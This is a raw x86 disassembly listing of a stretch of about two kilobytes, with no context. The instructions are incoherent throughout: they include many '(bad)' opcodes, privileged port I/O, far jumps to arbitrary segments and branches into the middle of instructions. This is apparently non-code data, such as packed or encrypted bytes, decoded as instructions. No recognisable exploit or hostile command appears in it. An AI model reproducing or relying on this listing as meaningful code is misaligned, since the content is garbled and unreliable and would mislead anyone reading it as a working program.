  41f4da:	sbb    esi,ebx
  41f4dc:	aas    
  41f4dd:	gs push ds
  41f4df:	out    0xd6,al
  41f4e1:	enter  0xb51d,0x2
  41f4e5:	out    0x90,eax
  41f4e7:	xchg   ebp,eax
  41f4e8:	cmp    cl,BYTE PTR ds:0x1e474bd9
  41f4ee:	rep ins DWORD PTR es:[edi],dx
  41f4f0:	int3   
  41f4f1:	rol    DWORD PTR [ecx-0x79],1
  41f4f4:	xor    BYTE PTR [ecx+esi*4-0x231817d5],dl
  41f4fb:	adc    bh,0xd3
  41f4fe:	mov    BYTE PTR [edx],dl
  41f500:	data16 into 
  41f502:	push   0x5b
  41f504:	ret    0x83e0
  41f507:	mov    ah,0x98
  41f509:	aad    0xbe
  41f50b:	fcmovnbe st,st(3)
  41f50d:	enter  0x347a,0xf4
  41f511:	fstp   QWORD PTR [edi+0x3d]
  41f514:	jno    0x41f51c
  41f516:	ss xchg ebx,eax
  41f518:	mov    ch,0xde
  41f51a:	push   edi
  41f51b:	xchg   DWORD PTR [edx+0x29a51889],ebx
  41f521:	imul   BYTE PTR [ebx-0x6873883c]
  41f527:	outs   dx,DWORD PTR ds:[esi]
  41f528:	and    eax,0x58c73582
  41f52d:	add    cl,dh
  41f52f:	mov    ah,0x61
  41f531:	jne    0x41f4b8
  41f533:	inc    ebp
  41f534:	adc    BYTE PTR ds:[esi+eax*4-0x57],cl
  41f539:	sar    BYTE PTR [ebx],1
  41f53b:	adc    eax,0x339d81d9
  41f540:	fdiv   QWORD PTR [ecx]
  41f542:	cmp    al,0x7
  41f544:	push   ecx
  41f545:	jle    0x41f4fc
  41f547:	pop    edi
  41f548:	push   ss
  41f549:	ficomp DWORD PTR [ebx+0x79]
  41f54c:	test   esi,eax
  41f54e:	out    0x35,al
  41f550:	stos   BYTE PTR es:[edi],al
  41f551:	and    BYTE PTR [ecx-0x46],dl
  41f554:	jb     0x41f512
  41f556:	inc    esp
  41f557:	fsub   DWORD PTR [esi+0xe]
  41f55a:	and    dl,BYTE PTR fs:[edi+0x1d0c6485]
  41f561:	stos   DWORD PTR es:[edi],eax
  41f562:	and    al,0x10
  41f564:	mov    edx,0xc99f53f8
  41f569:	or     eax,DWORD PTR [eax+0x58]
  41f56c:	adc    BYTE PTR [ecx-0x11],bl
  41f56f:	mov    esi,0x59a4e80b
  41f574:	jmp    0xc86aeefc
  41f579:	loopne 0x41f517
  41f57b:	xchg   BYTE PTR gs:[edi+0x4bcfba70],dh
  41f582:	in     eax,dx
  41f583:	test   eax,0xc502b252
  41f588:	addr16 dec esi
  41f58a:	in     eax,dx
  41f58b:	mov    al,ds:0x95982d7e
  41f590:	test   DWORD PTR [ebx],ebp
  41f592:	dec    ecx
  41f593:	and    BYTE PTR [edx-0x50],ch
  41f596:	(bad)  
  41f597:	push   eax
  41f598:	rcr    DWORD PTR [edi-0x7b126925],0xc9
  41f59f:	pop    esp
  41f5a0:	mov    ebp,0xe7433a52
  41f5a5:	mov    esi,0xaf7daafb
  41f5aa:	imul   DWORD PTR [eax-0x52]
  41f5ad:	push   0xefb7c155
  41f5b2:	int3   
  41f5b3:	ja     0x41f5c5
  41f5b5:	test   BYTE PTR [ecx+eax*2+0x7ec53b8b],bl
  41f5bc:	mov    ah,0xc5
  41f5be:	inc    ebp
  41f5bf:	sbb    ebx,ebx
  41f5c1:	jo     0x41f5a6
  41f5c3:	adc    BYTE PTR [esi+0x30],0xa7
  41f5c7:	nop
  41f5c8:	test   al,0xdc
  41f5ca:	pushf  
  41f5cb:	xchg   ecx,eax
  41f5cc:	jp     0x41f63a
  41f5ce:	and    bh,BYTE PTR [ecx-0x76f43509]
  41f5d4:	push   eax
  41f5d5:	ins    BYTE PTR es:[edi],dx
  41f5d6:	ja     0x41f5c3
  41f5d8:	mov    BYTE PTR [edx+edx*4],bh
  41f5db:	es ret 0xe20c
  41f5df:	jnp    0x41f612
  41f5e1:	mov    dh,0x37
  41f5e3:	adc    al,BYTE PTR [edi-0x7a09a408]
  41f5e9:	add    BYTE PTR [esi],dl
  41f5eb:	push   esp
  41f5ec:	mov    eax,0xb210e737
  41f5f1:	shl    cl,1
  41f5f3:	out    dx,eax
  41f5f4:	xchg   edx,eax
  41f5f5:	mov    dl,0x1d
  41f5f7:	sbb    ch,BYTE PTR [edi-0x65023053]
  41f5fd:	fild   WORD PTR [esp+edi*2]
  41f600:	stc    
  41f601:	(bad)  
  41f602:	xlat   BYTE PTR ds:[ebx]
  41f603:	ror    ebx,1
  41f605:	sti    
  41f606:	dec    esp
  41f607:	mov    edx,0x9e49223
  41f60c:	adc    bh,BYTE PTR [edi-0x14]
  41f60f:	add    eax,DWORD PTR [ebp+0x2be9c884]
  41f615:	dec    ebx
  41f616:	xchg   esi,eax
  41f617:	pop    edx
  41f618:	jmp    0xeae6:0x7376c6fa
  41f61f:	sub    al,dh
  41f621:	retf   0x3e8e
  41f624:	enter  0x5c7f,0x68
  41f628:	jmp    0x5ef5ee1c
  41f62d:	or     BYTE PTR [ecx-0x7badaaaa],ch
  41f633:	cdq    
  41f634:	sub    dl,bh
  41f636:	xor    eax,0x717bf31c
  41f63b:	mov    cl,0xbe
  41f63d:	jns    0x41f625
  41f63f:	outs   dx,BYTE PTR ds:[esi]
  41f640:	loopne 0x41f60b
  41f642:	mov    ah,dl
  41f644:	mov    dh,0x64
  41f646:	fcom   QWORD PTR [ebx+esi*2]
  41f649:	xlat   BYTE PTR ds:[ebx]
  41f64a:	cmp    esi,0x5123a7fa
  41f650:	xchg   BYTE PTR [esi-0x6173ed3],dh
  41f656:	and    DWORD PTR [edx+0xb],ecx
  41f659:	(bad)  
  41f65b:	(bad)  
  41f65c:	jbe    0x41f645
  41f65e:	rcr    DWORD PTR ds:0xc4e1b0d4,1
  41f664:	mov    ds:0x41ddebdd,al
  41f669:	add    BYTE PTR [eax],cl
  41f66b:	scas   eax,DWORD PTR es:[edi]
  41f66c:	push   ecx
  41f66d:	in     al,0xe5
  41f66f:	in     eax,dx
  41f670:	retf   
  41f671:	test   eax,0xdb8d03d4
  41f676:	mov    al,BYTE PTR [eiz*8+0x57f139fb]
  41f67d:	pusha  
  41f67e:	dec    ebx
  41f67f:	cmp    BYTE PTR [ecx+0x1a],al
  41f682:	xor    al,0x23
  41f684:	push   esi
  41f685:	push   ebp
  41f686:	call   0x13c9:0xf0a14a39
  41f68d:	(bad)  
  41f68f:	xor    eax,0xb957006
  41f694:	mov    ebp,0x7909705
  41f699:	add    ch,BYTE PTR [eax]
  41f69b:	add    al,dh
  41f69d:	cmp    al,0xd4
  41f69f:	shr    DWORD PTR [edx],1
  41f6a1:	lock ror bl,1
  41f6a4:	rcl    DWORD PTR [ebx-0x123d44ca],cl
  41f6aa:	lods   eax,DWORD PTR ds:[esi]
  41f6ab:	(bad)
  41f6af:	sub    eax,0x7f837a92
  41f6b4:	jno    0x41f666
  41f6b6:	adc    eax,0x5762b7d7
  41f6bb:	sahf   
  41f6bc:	xor    BYTE PTR ds:0xe6ecaba3,ah
  41f6c2:	pop    ss
  41f6c3:	shr    DWORD PTR [ecx-0x317ba293],cl
  41f6c9:	xor    eax,0x1cda3359
  41f6ce:	mov    DWORD PTR [edi+ecx*8-0x3d7eea94],esi
  41f6d5:	xchg   DWORD PTR [edx],edx
  41f6d7:	cmp    eax,0x317636ad
  41f6dc:	xchg   BYTE PTR [ebx-0x1e9263b],al
  41f6e2:	repnz dec eax
  41f6e4:	jno    0x41f682
  41f6e6:	jae    0x41f72e
  41f6e8:	jge    0x41f747
  41f6ea:	enter  0x1c5a,0x95
  41f6ee:	cs ret 0x1746
  41f6f2:	xor    ebp,DWORD PTR [edi+ecx*1+0x35]
  41f6f6:	jp     0x41f75d
  41f6f8:	mov    edi,DWORD PTR [edx]
  41f6fa:	pop    eax
  41f6fb:	iret   
  41f6fc:	fcomp  DWORD PTR [edi]
  41f6fe:	mov    dl,0x86
  41f700:	lods   al,BYTE PTR ds:[esi]
  41f701:	stc    
  41f702:	push   esi
  41f703:	inc    eax
  41f704:	lock inc ebx
  41f706:	rcl    DWORD PTR [esi+0xdca736],cl
  41f70c:	cmp    eax,edi
  41f70e:	xchg   edi,eax
  41f70f:	or     ebx,DWORD PTR [edi+0x6d]
  41f712:	test   BYTE PTR [ecx+0x1c7fac76],0xf8
  41f719:	pop    es
  41f71a:	cmp    esp,DWORD PTR [esi+0x21]
  41f71d:	jp     0x41f714
  41f71f:	in     al,0xf5
  41f721:	xchg   ebx,eax
  41f722:	or     eax,0xb7d759fd
  41f727:	dec    esp
  41f728:	repnz add eax,0x82ee8ded
  41f72e:	mov    BYTE PTR [edi-0x51],dl
  41f731:	pop    es
  41f732:	xchg   ecx,eax
  41f733:	xor    BYTE PTR [ecx+0x30c479aa],dl
  41f739:	outs   dx,DWORD PTR ds:[esi]
  41f73a:	pop    es
  41f73b:	sub    ebp,DWORD PTR [edx+0x55ca7955]
  41f741:	imul   ebp,DWORD PTR [edi],0xe5c4f3c9
  41f747:	ror    edx,cl
  41f749:	ins    DWORD PTR es:[edi],dx
  41f74a:	retf   
  41f74b:	neg    DWORD PTR [edx-0x48]
  41f74e:	adc    DWORD PTR [eax-0x54],edi
  41f751:	pushf  
  41f752:	jg     0x41f7ae
  41f754:	sub    esi,DWORD PTR [eax]
  41f756:	mov    ah,0x29
  41f758:	xor    al,0xcd
  41f75a:	int3   
  41f75b:	or     eax,ecx
  41f75d:	xchg   esp,eax
  41f75e:	push   es
  41f75f:	retf   0x33ea
  41f762:	lock sub ecx,ebx
  41f765:	sub    BYTE PTR [ebp+0x54],bl
  41f768:	repnz add edi,ebx
  41f76b:	jbe    0x41f7a2
  41f76d:	inc    ebp
  41f76e:	in     al,dx
  41f76f:	repz out 0x59,eax
  41f772:	repz adc DWORD PTR [eax-0x4e98055b],ebx
  41f779:	fsincos 
  41f77b:	stc    
  41f77c:	xchg   esp,eax
  41f77d:	sub    DWORD PTR [eax+0xd],0xbf0cc9d0
  41f784:	or     edi,DWORD PTR [ebx]
  41f786:	out    dx,al
  41f787:	idiv   DWORD PTR [esi]
  41f789:	push   edx
  41f78a:	in     eax,dx
  41f78b:	test   eax,0xaaf93747
  41f790:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f791:	fsub   QWORD PTR [esi]
  41f793:	scas   eax,DWORD PTR es:[edi]
  41f794:	or     dl,BYTE PTR [ebx]
  41f796:	xor    DWORD PTR [ebx],esi
  41f798:	test   BYTE PTR [edx+0x4a11949b],dl
  41f79e:	inc    eax
  41f79f:	cmp    DWORD PTR [edi+0x5fec9c80],0xfffffff2
  41f7a6:	aam    0x1f
  41f7a8:	sub    esp,eax
  41f7aa:	pop    edi
  41f7ab:	ret    
  41f7ac:	daa    
  41f7ad:	iret   
  41f7ae:	jle    0x41f7be
  41f7b0:	imul   ebp,eax,0x68
  41f7b3:	retf   0xdbe
  41f7b6:	inc    edi
  41f7b7:	xchg   BYTE PTR [edx-0x3bad70f5],dl
  41f7bd:	pop    ecx
  41f7be:	lds    ebp,FWORD PTR [eax-0x51af7ab7]
  41f7c4:	xor    eax,0xef1e4c76
  41f7c9:	sar    DWORD PTR [esi+0x7b],0xc0
  41f7cd:	jmp    0x4a9e:0x98fe6411
  41f7d4:	mov    DWORD PTR [ebp*2+0x40a72aeb],ecx
  41f7db:	cs sti 
  41f7dd:	or     al,0xe0
  41f7df:	cwde   
  41f7e0:	icebp  
  41f7e1:	adc    ecx,DWORD PTR [edx-0x69]
  41f7e4:	mov    eax,ecx
  41f7e6:	xchg   edi,eax
  41f7e7:	pushaw 
  41f7e9:	sbb    BYTE PTR [ebx+0x8b5d7de],al
  41f7ef:	ror    DWORD PTR [ecx+0x4387d097],0xc3
  41f7f6:	in     eax,dx
  41f7f7:	test   BYTE PTR [esi],dl
  41f7f9:	out    dx,al
  41f7fa:	cmp    BYTE PTR [ecx],dl
  41f7fc:	call   0x3ce4:0xa4b5fe08
  41f803:	fisubr DWORD PTR [esi-0x42]
  41f806:	test   edx,esi
  41f808:	ins    BYTE PTR es:[edi],dx
  41f809:	shl    BYTE PTR gs:[edi+0x29b6f0b1],1
  41f810:	and    al,0x71
  41f812:	mov    ds:0xf454ed84,al
  41f817:	and    al,0x83
  41f819:	stc    
  41f81a:	xchg   edx,eax
  41f81b:	pop    ebx
  41f81c:	xchg   ebx,eax
  41f81d:	pop    edx
  41f81e:	ret    0x3f5c
  41f821:	adc    eax,0x529c1c86
  41f826:	add    BYTE PTR [ebx+0x7eed924],bh
  41f82c:	mov    bh,0x69
  41f82e:	lods   eax,DWORD PTR ds:[esi]
  41f82f:	xchg   ecx,eax
  41f830:	in     al,dx
  41f831:	sbb    BYTE PTR [ecx-0x9],0xa4
  41f835:	pop    edx
  41f836:	cmp    BYTE PTR [esi-0x79],bl
  41f839:	push   0x73
  41f83b:	(bad)
  41f83f:	sub    DWORD PTR [edi+0x6c],edx
  41f842:	jae    0x41f818
  41f844:	test   al,0xbf
  41f846:	sbb    esi,eax
  41f848:	lock xor eax,0xb89152ff
  41f84e:	adc    al,0x7a
  41f850:	pop    es
  41f851:	sub    ecx,DWORD PTR [ebp-0x160abf3b]
  41f857:	loop   0x41f8cc
  41f859:	test   eax,0xb213f5ad
  41f85e:	cmp    al,0x48
  41f860:	adc    BYTE PTR [esi+esi*4],ch
  41f863:	retf   0x16f3
  41f866:	sbb    eax,0xedbdff4f
  41f86b:	and    DWORD PTR [ebx+0x15],esi
  41f86e:	jmp    0x2a62:0xff0fed71
  41f875:	rol    BYTE PTR [eax-0x3b33461d],cl
  41f87b:	xchg   edi,eax
  41f87c:	lahf   
  41f87d:	inc    edi
  41f87e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f87f:	xor    BYTE PTR ds:0x9a1b1f7a,al
  41f885:	pop    eax
  41f886:	imul   ebp,DWORD PTR [edx+esi*2-0x107594dc],0x18
  41f88e:	jns    0x41f8f0
  41f890:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f891:	cli    
  41f892:	imul   edx,DWORD PTR [ebx-0x78],0xffffffee
  41f896:	mov    WORD PTR [eax-0x29],fs
  41f899:	pop    edi
  41f89a:	or     ebx,DWORD PTR [eax+0x1f460af0]
  41f8a0:	jl     0x41f8d5
  41f8a2:	dec    edi
  41f8a3:	and    al,0x80
  41f8a5:	mov    ecx,DWORD PTR [ecx-0x34]
  41f8a8:	pop    es
  41f8a9:	lock call 0xdc16ce5a
  41f8af:	sahf   
  41f8b0:	int3   
  41f8b1:	pop    eax
  41f8b2:	xchg   edx,eax
  41f8b3:	inc    esp
  41f8b4:	mov    esp,0xcbdf6410
  41f8b9:	mov    ds,WORD PTR [edi+eiz*2+0x6f929a2e]
  41f8c0:	mov    WORD PTR [ecx-0x70],fs
  41f8c3:	dec    BYTE PTR [ecx-0x6f]
  41f8c6:	lahf   
  41f8c7:	test   ebp,ecx
  41f8c9:	pop    ebp
  41f8ca:	inc    ecx
  41f8cb:	adc    bl,BYTE PTR [ebp+0x44]
  41f8ce:	out    dx,al
  41f8cf:	cmp    DWORD PTR [esi+0x311801f7],edx
  41f8d5:	sbb    ah,bh
  41f8d7:	sbb    edi,DWORD PTR [ebx+0x23]
  41f8da:	dec    ebx
  41f8db:	fnsave [edi+0x159eed90]
  41f8e1:	rol    BYTE PTR [ecx-0x1c23da],1
  41f8e7:	ins    DWORD PTR es:[edi],dx
  41f8e8:	mov    dl,0x5b
  41f8ea:	pop    ss
  41f8eb:	mov    edx,0xaca6471f
  41f8f0:	xchg   ecx,eax
  41f8f1:	or     ch,ah
  41f8f3:	dec    ecx
  41f8f4:	std    
  41f8f5:	sub    ax,0x3427
  41f8f9:	dec    esp
  41f8fa:	xor    BYTE PTR [ebx],cl
  41f8fc:	xchg   edx,eax
  41f8fd:	out    0xf8,al
  41f8ff:	sbb    bl,dl
  41f901:	sub    bl,0xc9
  41f904:	adc    ch,BYTE PTR [eax-0x674cd36f]
  41f90a:	imul   ecx,DWORD PTR [edx],0x22ff66a9
  41f910:	jg     0x41f8f8
  41f912:	call   0xe541:0x712f9371
  41f919:	dec    ebp
  41f91a:	push   es
  41f91b:	or     bl,BYTE PTR [edi-0x28]
  41f91e:	loopne 0x41f8f7
  41f920:	loope  0x41f912
  41f922:	push   edi
  41f923:	(bad)  [esp+eax*2-0x17]
  41f927:	test   DWORD PTR [eax-0x25fceb8e],esi
  41f92d:	adc    eax,0xec82828d
  41f932:	push   cs
  41f933:	popf   
  41f934:	xchg   edx,eax
  41f935:	fs in  al,0xc0
  41f938:	sub    bl,BYTE PTR ds:0xa228d8f
  41f93e:	das    
  41f93f:	jecxz  0x41f992
  41f941:	je     0x41f8fe
  41f943:	mov    edx,0xe80eb4f2
  41f948:	or     al,0x38
  41f94a:	and    BYTE PTR [ebx],0x26
  41f94d:	hlt    
  41f94e:	inc    edx
  41f94f:	push   0xaac40c77
  41f954:	inc    edi
  41f955:	inc    edx
  41f956:	(bad)  
  41f957:	lods   al,BYTE PTR ds:[esi]
  41f958:	dec    esi
  41f959:	mov    bh,0x7f
  41f95b:	xor    DWORD PTR [ecx+0x280b448c],ecx
  41f961:	dec    ebx
  41f962:	jb     0x41f92c
  41f964:	sub    DWORD PTR [eax+ecx*2-0x21],ebp
  41f968:	jmp    0xd271990d
  41f96d:	mov    esp,0x97a175bf
  41f972:	hlt    
  41f973:	xchg   ebp,eax
  41f974:	cmp    eax,0xe76faafa
  41f979:	xchg   edx,eax
  41f97a:	imul   eax,DWORD PTR ds:0x1aeb4b25,0x3d99d9b3
  41f984:	mov    ds:0x7432fd2b,eax
  41f989:	inc    esp
  41f98a:	mov    esi,0x17f3115
  41f98f:	mov    ebx,0x5f7c7913
  41f994:	test   BYTE PTR [ebp+0x40],bh
  41f997:	(bad)  
  41f998:	imul   edi,DWORD PTR ds:0x500a8a39,0xffffff98
  41f99f:	inc    eax
  41f9a0:	sbb    eax,0x8e67021a
  41f9a5:	jne    0x41fa0d
  41f9a7:	out    dx,eax
  41f9a8:	pop    ds
  41f9a9:	test   edi,edi
  41f9ab:	jmp    DWORD PTR [ebx+0x6]
  41f9ae:	sbb    BYTE PTR es:[edx],ah
  41f9b1:	lods   al,BYTE PTR ds:[esi]
  41f9b2:	cli    
  41f9b3:	and    BYTE PTR [esi+0x48e14071],bl
  41f9b9:	mov    cl,0xe0
  41f9bb:	dec    edx
  41f9bc:	or     bh,BYTE PTR [ecx-0x1a6e2660]
  41f9c2:	cs in  al,dx
  41f9c4:	dec    ebx
  41f9c5:	popa   
  41f9c6:	pusha  
  41f9c7:	dec    ebx
  41f9c8:	shl    DWORD PTR [eax],1
  41f9ca:	inc    esi
  41f9cb:	xchg   ebx,eax
  41f9cc:	sub    DWORD PTR [ebp-0x3c01cb6d],ecx
  41f9d2:	pop    esp
  41f9d3:	(bad)  
  41f9d4:	xchg   BYTE PTR [edx+0x7a],cl
  41f9d7:	std    
  41f9d8:	pop    ds
  41f9d9:	ins    BYTE PTR es:[edi],dx
  41f9da:	ds addr16 in eax,dx
  41f9dd:	push   ecx
  41f9de:	in     al,0xc7
  41f9e0:	ins    BYTE PTR es:[edi],dx
  41f9e1:	jns    0x41f97e
  41f9e3:	or     eax,0x4ba61ab5
  41f9e8:	push   es
  41f9e9:	sbb    ebp,DWORD PTR [edi-0x31bbe271]
  41f9ef:	xor    al,0x34
  41f9f1:	jp     0x41f9e8
  41f9f3:	push   es
  41f9f4:	mov    ds:0x1351aed9,eax
  41f9f9:	jns    0x41f98a
  41f9fb:	sbb    al,0xfb
  41f9fd:	popf   
  41f9fe:	mov    bl,0xac
  41fa00:	and    ecx,DWORD PTR [ebp+eax*8+0x43]
  41fa04:	xor    bl,BYTE PTR [esi]
  41fa06:	push   ebp
  41fa07:	enter  0xea,0x3c
  41fa0b:	in     eax,dx
  41fa0c:	ins    DWORD PTR es:[edi],dx
  41fa0d:	sub    al,0x78
  41fa0f:	in     eax,dx
  41fa10:	aad    0xa7
  41fa12:	pop    ss
  41fa13:	pop    edi
  41fa14:	pop    ecx
  41fa15:	push   ss
  41fa16:	faddp  st(6),st
  41fa18:	xchg   edx,eax
  41fa19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa1a:	jne    0x41fa81
  41fa1c:	data16 fdivr QWORD PTR [eax-0x7fcd356f]
  41fa23:	and    DWORD PTR [eax+0x65],ebx
  41fa26:	jb     0x41fa22
  41fa28:	mov    ebx,0xae9493b3
  41fa2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa2e:	popf   
  41fa2f:	icebp  
  41fa30:	and    BYTE PTR [ebp-0x13],dl
  41fa33:	out    0xab,eax
  41fa35:	xlat   BYTE PTR ds:[ebx]
  41fa36:	dec    BYTE PTR [ebp+0x3a]
  41fa39:	int    0x3f
  41fa3b:	cwde   
  41fa3c:	(bad)  
  41fa3d:	in     al,dx
  41fa3e:	cmp    BYTE PTR [ebx+0x20],dh
  41fa41:	int3   
  41fa42:	ins    DWORD PTR es:[edi],dx
  41fa43:	mov    ebp,0x25fa6116
  41fa48:	aas    
  41fa49:	jmp    0x41faa3
  41fa4b:	pop    ds
  41fa4c:	adc    DWORD PTR [ecx-0x44a55cfc],ebp
  41fa52:	arpl   cx,dx
  41fa54:	rcr    BYTE PTR [esi],1
  41fa56:	inc    esp
  41fa57:	and    al,0xc9
  41fa59:	pop    ebx
  41fa5a:	xchg   BYTE PTR [ebp+0x308e4a54],dh
  41fa60:	mov    edx,0x838ca2b1
  41fa65:	pand   mm6,mm6
  41fa68:	fisttp QWORD PTR [ebp+0x16]
  41fa6b:	mov    ebx,esp
  41fa6d:	out    dx,al
  41fa6e:	sbb    eax,0xe0d040b6
  41fa73:	and    al,0xa3
  41fa75:	cmp    ah,dl
  41fa77:	mov    ah,0xb9
  41fa79:	mov    BYTE PTR [ebx+0xe],bh
  41fa7c:	frstor [ecx]
  41fa7e:	retf   0xd06f
  41fa81:	sbb    BYTE PTR [edi-0x3704c008],al
  41fa87:	jle    0x41fa89
  41fa89:	xchg   ecx,eax
  41fa8a:	inc    DWORD PTR [ecx+0xb]
  41fa8d:	sbb    DWORD PTR [edi+edx*8-0x31],ecx
  41fa91:	adc    eax,0x8d9b991c
  41fa96:	mov    ebx,0x56dce443
  41fa9b:	mov    ds:0x3bbb8292,eax
  41faa0:	arpl   bp,di
  41faa2:	aam    0x95
  41faa4:	test   DWORD PTR [ebp+ebx*8+0x1a050249],ebx
  41faab:	les    eax,FWORD PTR [edx+0x32]
  41faae:	add    DWORD PTR [eax+0x31],esi
  41fab1:	mov    esi,0x9b0bb283
  41fab6:	cwde   
  41fab7:	std    
  41fab8:	icebp  
  41fab9:	repz data16 std 
  41fabc:	stc    
  41fabd:	shl    DWORD PTR [ebx],1
  41fabf:	push   esi
  41fac0:	fist   DWORD PTR [edi+0x4e]
  41fac3:	aas    
  41fac4:	mov    ds:0x801143f,eax
  41fac9:	fisub  DWORD PTR [edi-0x23]
  41facc:	xchg   BYTE PTR [eax],bh
  41face:	aad    0x83
  41fad0:	leave  
  41fad1:	add    edi,DWORD PTR [esi-0x22]
  41fad4:	ret    0xf6f2
  41fad7:	mov    bh,0xc7
  41fad9:	jns    0x41fb1b
  41fadb:	ja     0x41fb17
  41fadd:	iret   
  41fade:	push   ss
  41fadf:	in     eax,0x5b
  41fae1:	mov    bh,0xa6
  41fae3:	out    0xfa,al
  41fae5:	into   
  41fae6:	inc    esp
  41fae7:	push   edi
  41fae8:	cmp    esp,ebx
  41faea:	push   0x71
  41faec:	ins    BYTE PTR es:[edi],dx
  41faed:	mov    ah,0x66
  41faef:	jge    0x41fa79
  41faf1:	or     ebp,DWORD PTR ds:0xcb2638f7
  41faf7:	dec    ebp
  41faf8:	sub    eax,0x2d257488
  41fafd:	xor    dh,BYTE PTR [edx-0x2283c6a8]
  41fb03:	std    
  41fb04:	push   esp
  41fb05:	xor    eax,0xd85c2bac
  41fb0a:	pop    edx
  41fb0b:	lahf   
  41fb0c:	lock mov ecx,0x9b99144a
  41fb12:	sar    BYTE PTR [edx+0x64],cl
  41fb15:	mov    al,0xca
  41fb17:	dec    esp
  41fb18:	out    0x51,eax
  41fb1a:	mov    ds:0x492b09c7,eax
  41fb1f:	pop    ebx
  41fb20:	push   ebx
  41fb21:	cli    
  41fb22:	pop    ecx
  41fb23:	cdq    
  41fb24:	adc    al,0x67
  41fb26:	aaa    
  41fb27:	jb     0x41fae2
  41fb29:	xchg   BYTE PTR [eax-0xa6da597],bl
  41fb2f:	jbe    0x41facf
  41fb31:	(bad)  
  41fb32:	pop    edi
  41fb33:	and    DWORD PTR [esi+ebx*4+0x2137fdc2],0xffffff81
  41fb3b:	repnz int 0x99
  41fb3e:	cmc    
  41fb3f:	ja     0x41fb5d
  41fb41:	in     eax,dx
  41fb42:	pop    ds
  41fb43:	push   ebx
  41fb44:	ret    0x372f
  41fb47:	xchg   esp,eax
  41fb48:	shrd   DWORD PTR [edx-0x2136b4c3],esp,cl
  41fb4f:	inc    ebx
  41fb50:	(bad)  
  41fb51:	out    0xf1,al
  41fb53:	ins    DWORD PTR es:[edi],dx
  41fb54:	adc    ah,BYTE PTR [ecx+ecx*1-0x5c40143]
  41fb5b:	xchg   BYTE PTR [edx+0x3f],ah
  41fb5e:	shl    BYTE PTR [ebp+edx*8-0x59650466],0x81
  41fb66:	push   esp
  41fb67:	aaa    
  41fb68:	call   0x216:0x6f9df0c5
  41fb6f:	cmp    edi,DWORD PTR [edi-0x22]
  41fb72:	mov    bl,0xee
  41fb74:	pop    esp
  41fb75:	adc    edx,DWORD PTR [ecx-0x67]
  41fb78:	aam    0x33
  41fb7a:	or     bl,BYTE PTR [edx-0x65a1a9c8]
  41fb80:	jb     0x41fb6c
  41fb82:	jnp    0x41fbf9
  41fb84:	shl    DWORD PTR [edx],0xad
  41fb87:	dec    ebp
  41fb88:	das    
  41fb89:	pop    ds
  41fb8a:	out    dx,al
  41fb8b:	fnsave [ebp-0x31]
  41fb8e:	or     al,BYTE PTR [edx]
  41fb90:	and    eax,0x22e509ec
  41fb95:	inc    esi
  41fb96:	idiv   eax
  41fb98:	dec    edx
  41fb99:	add    al,0x19
  41fb9b:	xchg   cl,cl
  41fb9d:	fwait
  41fb9e:	pop    es
  41fb9f:	in     al,dx
  41fba0:	imul   edx,DWORD PTR [ecx-0x7d],0x4a0aadc2
  41fba7:	xchg   ebp,eax
  41fba8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fba9:	addr16 icebp 
  41fbab:	inc    ebx
  41fbac:	mov    bh,0x1c
  41fbae:	sub    eax,0x47f8b2fd
  41fbb3:	fidiv  DWORD PTR [ecx]
  41fbb5:	jns    0x41fc1b
  41fbb7:	test   eax,0xfe494a7b
  41fbbc:	push   edx
  41fbbd:	loop   0x41fc0f
  41fbbf:	dec    esp
  41fbc0:	add    edi,edi
  41fbc2:	in     al,dx
  41fbc3:	(bad)  
  41fbc4:	enter  0xb722,0x17
  41fbc8:	adc    dl,cl
  41fbca:	js     0x41fbb6
  41fbcc:	neg    DWORD PTR [ecx*4+0x169d19e]
  41fbd3:	add    DWORD PTR [esi],ecx
  41fbd5:	stc    
  41fbd6:	ficom  DWORD PTR [edi-0x4ec561d0]
  41fbdc:	mov    bl,BYTE PTR [edx+ebx*2]
  41fbdf:	pop    ebx
  41fbe0:	imul   edx,DWORD PTR [eax],0xfaf6c4df
  41fbe6:	push   ss
  41fbe7:	outs   dx,DWORD PTR ds:[esi]
  41fbe8:	jae    0x41fbe9
  41fbea:	clc    
  41fbeb:	sahf   
  41fbec:	adc    eax,eax
  41fbee:	jge    0x41fbef
  41fbf0:	out    dx,eax
  41fbf1:	dec    esp
  41fbf2:	pop    eax
  41fbf3:	je     0x41fbc8
  41fbf5:	jne    0x41fb86
  41fbf7:	adc    ecx,ecx
  41fbf9:	mov    esi,0x4661c003
  41fbfe:	(bad)  
  41fbff:	dec    ebx
  41fc00:	push   eax
  41fc01:	outs   dx,DWORD PTR ds:[esi]
  41fc02:	push   0x34
  41fc04:	sub    al,0xdf
  41fc06:	ror    BYTE PTR ds:0x63a158f3,0x78
  41fc0d:	lods   al,BYTE PTR ds:[esi]
  41fc0e:	mov    bl,0x4a
  41fc10:	imul   esi,edi,0xffffffe4
  41fc13:	clc    
  41fc14:	outs   dx,BYTE PTR ds:[esi]
  41fc15:	jmp    0x41fbcf
  41fc17:	fldenv [edx]
  41fc19:	jae    0x41fc18
  41fc1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc1c:	inc    ebx
  41fc1d:	(bad)  
  41fc1e:	in     eax,dx
  41fc1f:	inc    esp
  41fc20:	sbb    al,0xa1
  41fc22:	sub    dl,cl
  41fc24:	sub    eax,0x4e459011
  41fc29:	xor    cl,dl
  41fc2b:	hlt    
  41fc2c:	mov    edx,DWORD PTR [edi+0x68]
  41fc2f:	mov    ch,0xe7
  41fc31:	mov    ebp,0xeaf4174
  41fc36:	ds loop 0x41fc74
  41fc39:	cmp    BYTE PTR [ebp-0x3936978b],0x42
  41fc40:	and    DWORD PTR [ebx-0x2224f320],edi
  41fc46:	repnz les ebx,FWORD PTR [edx]
  41fc49:	jg     0x41fc3a
  41fc4b:	jle    0x41fca3
  41fc4d:	xor    eax,0x2cc53495
  41fc52:	(bad)  
  41fc53:	out    0x5f,al
  41fc55:	push   edx
  41fc56:	dec    esi
  41fc57:	jo     0x41fc2e
  41fc59:	push   esi
  41fc5a:	popa   
  41fc5b:	dec    edi
  41fc5c:	xor    al,0xcd
  41fc5e:	jno    0x41fc56
  41fc60:	ficomp WORD PTR [ecx+0x5e]
  41fc63:	push   edi
  41fc64:	dec    esp
  41fc65:	cdq    
